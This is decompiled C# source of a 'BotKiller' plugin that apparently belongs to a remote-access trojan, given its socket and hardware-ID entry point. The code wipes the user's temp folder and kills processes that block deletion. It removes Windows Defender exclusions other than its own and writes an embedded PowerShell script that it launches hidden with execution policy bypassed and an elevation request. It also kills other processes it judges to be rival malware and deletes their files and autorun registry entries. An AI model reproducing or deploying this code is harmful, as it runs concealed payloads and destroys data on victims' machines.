using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using BotKiller.Helper;
using Microsoft.Win32;
using Plugin.Properties;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		new Thread((ThreadStart)delegate
		{
			TempClear();
		}).Start();
		new Thread((ThreadStart)delegate
		{
			RemoveExclusion();
		}).Start();
		try
		{
			string text = Path.GetTempFileName() + ".ps1";
			File.WriteAllText(text, Resource1.String1);
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/c start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath '\"" + text + "\"' & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false,
				Verb = "runas"
			});
		}
		catch
		{
		}
		RunBotKiller();
	}

	public static void TempClear()
	{
		string? environmentVariable = Environment.GetEnvironmentVariable("temp");
		RecursiveDelete(environmentVariable);
		Console.WriteLine(environmentVariable);
	}

	public static void RecursiveDelete(string path)
	{
		string[] files = Directory.GetFiles(path);
		foreach (string path2 in files)
		{
			try
			{
				File.Delete(path2);
			}
			catch
			{
				try
				{
					Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(path2));
					for (int j = 0; j < processesByName.Length; j++)
					{
						processesByName[j].Kill();
					}
					File.Delete(path2);
				}
				catch
				{
				}
			}
		}
		files = Directory.GetDirectories(path);
		for (int i = 0; i < files.Length; i++)
		{
			RecursiveDelete(files[i]);
		}
		try
		{
			Directory.Delete(path);
		}
		catch
		{
		}
	}

	public static void RunBotKiller()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		ObjectQuery val = new ObjectQuery("SELECT * FROM Win32_Process");
		ManagementObjectCollection obj = new ManagementObjectSearcher(new ManagementScope("\\\\.\\root\\cimv2"), val).Get();
		List<ManagementObject> list = new List<ManagementObject>();
		ManagementObjectEnumerator enumerator = obj.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject item = (ManagementObject)enumerator.Current;
				list.Add(item);
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		Parallel.ForEach(list, new ParallelOptions
		{
			MaxDegreeOfParallelism = 3
		}, delegate(ManagementObject process)
		{
			try
			{
				string text = ((ManagementBaseObject)process)["ExecutablePath"].ToString();
				if (Scan(text))
				{
					Console.WriteLine(text);
					bool flag = false;
					Process processById = Process.GetProcessById(Convert.ToInt32(((ManagementBaseObject)process)["ProcessId"]));
					if (!WindowIsVisible(processById.MainWindowTitle) && (ItsFileHidden(text) || Inspection(text) || text.Contains(Environment.GetEnvironmentVariable("temp"))))
					{
						flag = true;
					}
					else if (ItsMutexMalicos(processById))
					{
						flag = true;
					}
					if (flag)
					{
						processById.Kill();
						RemoveFile(text);
						Console.WriteLine("Trojan: " + text);
					}
				}
			}
			catch
			{
			}
		});
	}

	public static string[] ExclusionPath(string ComputerID)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\Microsoft\\Windows\\Defender", "SELECT * FROM MSFT_MpPreference").Get().GetEnumerator();
		string[] array;
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.Current;
				if (!(((ManagementBaseObject)val)["ComputerID"].ToString() == ComputerID))
				{
					continue;
				}
				try
				{
					string fileName = Process.GetCurrentProcess().MainModule.FileName;
					List<string> list = new List<string>();
					array = (string[])((ManagementBaseObject)val)["ExclusionPath"];
					foreach (string text in array)
					{
						if (!fileName.Contains(text) && !text.Contains("xdwd"))
						{
							list.Add(text);
						}
					}
					array = list.ToArray();
				}
				catch
				{
					goto IL_00c8;
				}
				goto IL_00f9;
				IL_00c8:
				array = new string[0];
				goto IL_00f9;
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return new string[0];
		IL_00f9:
		return array;
	}

	public static string[] ExclusionProcess(string ComputerID)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\Microsoft\\Windows\\Defender", "SELECT * FROM MSFT_MpPreference").Get().GetEnumerator();
		string[] array;
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.Current;
				if (!(((ManagementBaseObject)val)["ComputerID"].ToString() == ComputerID))
				{
					continue;
				}
				try
				{
					string fileName = Process.GetCurrentProcess().MainModule.FileName;
					List<string> list = new List<string>();
					array = (string[])((ManagementBaseObject)val)["ExclusionProcess"];
					foreach (string text in array)
					{
						if (!fileName.Contains(text) && !text.Contains("xdwd"))
						{
							list.Add(text);
						}
					}
					array = list.ToArray();
				}
				catch
				{
					goto IL_00c8;
				}
				goto IL_00f9;
				IL_00c8:
				array = new string[0];
				goto IL_00f9;
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return new string[0];
		IL_00f9:
		return array;
	}

	public static string[] ComputerId()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		List<string> list = new List<string>();
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\Microsoft\\Windows\\Defender", "SELECT * FROM MSFT_MpPreference").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.Current;
				list.Add(((ManagementBaseObject)val)["ComputerID"].ToString());
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return list.ToArray();
	}

	public static void RemoveExclusion()
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] array = ComputerId();
			foreach (string text in array)
			{
				try
				{
					string text2 = "MSFT_MpPreference.ComputerID='" + text + "'";
					ManagementObject val = new ManagementObject("root\\Microsoft\\Windows\\Defender", text2, (ObjectGetOptions)null);
					ManagementBaseObject methodParameters = val.GetMethodParameters("Remove");
					methodParameters["ExclusionPath"] = ExclusionPath(text);
					methodParameters["ExclusionProcess"] = ExclusionProcess(text);
					val.InvokeMethod("Remove", methodParameters, (InvokeMethodOptions)null);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	private static bool Inspection(string threat)
	{
		if (threat.Contains("xdwd"))
		{
			return false;
		}
		if (threat == Process.GetCurrentProcess().MainModule.FileName)
		{
			return false;
		}
		switch (Path.GetFileName(threat))
		{
		case "TLauncher.exe":
		case "java.exe":
		case "Discord.exe":
		case "Update.exe":
		case "browser.exe":
		case "chrome.exe":
		case "opera.exe":
		case "firefox.exe":
		case "Telegram.exe":
			return false;
		default:
			if (threat.StartsWith(Environment.GetEnvironmentVariable("temp")))
			{
				return true;
			}
			if (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)))
			{
				return true;
			}
			if (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)))
			{
				return true;
			}
			if (threat.Contains("wscript.exe"))
			{
				return true;
			}
			if (threat.StartsWith(Path.Combine(Path.GetPathRoot(Environment.SystemDirectory), "Windows\\Microsoft.NET")))
			{
				return true;
			}
			return false;
		}
	}

	private static bool Scan(string path)
	{
		path = path.ToLower();
		if (!(path == "c:\\windows\\system32\\wbem\\wmiprvse.exe") && !(path == "c:\\windows\\system32\\svchost.exe") && !(path == "c:\\windows\\system32\\lsass.exe") && !(path == "c:\\windows\\system32\\csrss.exe") && !(path == "c:\\windows\\system32\\wininit.exe") && !(path == "c:\\windows\\system32\\services.exe") && !(path == "c:\\windows\\system32\\smss.exe") && !(path == "c:\\windows\\system32\\dwm.exe") && !(path == "c:\\windows\\system32\\ntoskrnl.exe") && !(path == "c:\\windows\\system32\\cmd.exe") && !(path == "c:\\windows\\system32\\powershell.exe") && !(path == "c:\\windows\\system32\\conhost.exe") && !(path == "c:\\windows\\system32\\ctfmon.exe") && !(path == "c:\\windows\\system32\\winlogon.exe") && !(path == "c:\\windows\\system32\\spoolsv.exe") && !(path == "c:\\windows\\system32\\wudfhost.exe"))
		{
			switch (path)
			{
			default:
				if (!path.Contains("c:\\windows\\system32\\driverstore\\filerepository\\") && !path.Contains("c:\\windows\\systemapps") && !path.Contains("xdwd"))
				{
					return true;
				}
				break;
			case "c:\\windows\\system32\\wudfhost.exe":
			case "c:\\windows\\system32\\mousocoreworker.exe":
			case "c:\\windows\\system32\\rundll32.exe":
			case "c:\\windows\\system32\\dllhost.exe":
			case "c:\\windows\\system32\\fontdrvhost.exe":
			case "c:\\windows\\system32\\dashost.exe":
			case "c:\\windows\\system32\\aggregatorhost.exe":
			case "c:\\windows\\system32\\wlanext.exe":
			case "c:\\windows\\system32\\elanfpservice.exe":
			case "c:\\windows\\system32\\searchindexer.exe":
			case "c:\\windows\\system32\\securityhealthsystray.exe":
			case "c:\\windows\\system32\\sihost.exe":
			case "c:\\windows\\system32\\searchindexer.exe.exe":
			case "c:\\windows\\system32\\runtimebroker.exe":
			case "c:\\windows\\system32\\notepad.exe":
			case "c:\\windows\\system32\\musnotifyicon.exe":
			case "c:\\windows\\system32\\comppkgsrv.exe":
			case "c:\\windows\\system32\\searchfilterhost.exe":
			case "c:\\windows\\system32\\taskmgr.exe":
			case "c:\\windows\\system32\\taskhostw.exe":
			case "c:\\windows\\system32\\applicationframehost.exe":
			case "c:\\windows\\syswow64\\dllhost.exe":
			case "c:\\windows\\explorer.exe":
			case "c:\\windows\\regedit.exe":
				break;
			}
		}
		return false;
	}

	private static bool ItsMutexMalicos(Process process)
	{
		try
		{
			string[] array = GetMutex.Get(process);
			foreach (string text in array)
			{
				if (text.Length == 16)
				{
					return true;
				}
				if (text.StartsWith("DCR"))
				{
					return true;
				}
				if (text.StartsWith("Client"))
				{
					return true;
				}
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool ItsFileHidden(string path)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(path);
			if (attributes == FileAttributes.Hidden || attributes == FileAttributes.System)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool WindowIsVisible(string WinTitle)
	{
		try
		{
			return IsWindowVisible(FindWindow(null, WinTitle));
		}
		catch (Exception)
		{
		}
		return false;
	}

	private static void RemoveFile(string processName)
	{
		try
		{
			RegistryDelete("Software\\Microsoft\\Windows\\CurrentVersion\\Run", processName);
			RegistryDelete("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", processName);
			Thread.Sleep(100);
			File.Delete(processName);
		}
		catch (Exception)
		{
		}
	}

	private static void RegistryDelete(string regPath, string payload)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(regPath, writable: true))
			{
				if (registryKey != null)
				{
					string[] valueNames = registryKey.GetValueNames();
					foreach (string name in valueNames)
					{
						if (registryKey.GetValue(name).ToString().Equals(payload))
						{
							registryKey.DeleteValue(name);
						}
					}
				}
			}
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			using RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(regPath, writable: true);
			if (registryKey2 == null)
			{
				return;
			}
			string[] valueNames = registryKey2.GetValueNames();
			foreach (string name2 in valueNames)
			{
				if (registryKey2.GetValue(name2).ToString().Equals(payload))
				{
					registryKey2.DeleteValue(name2);
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
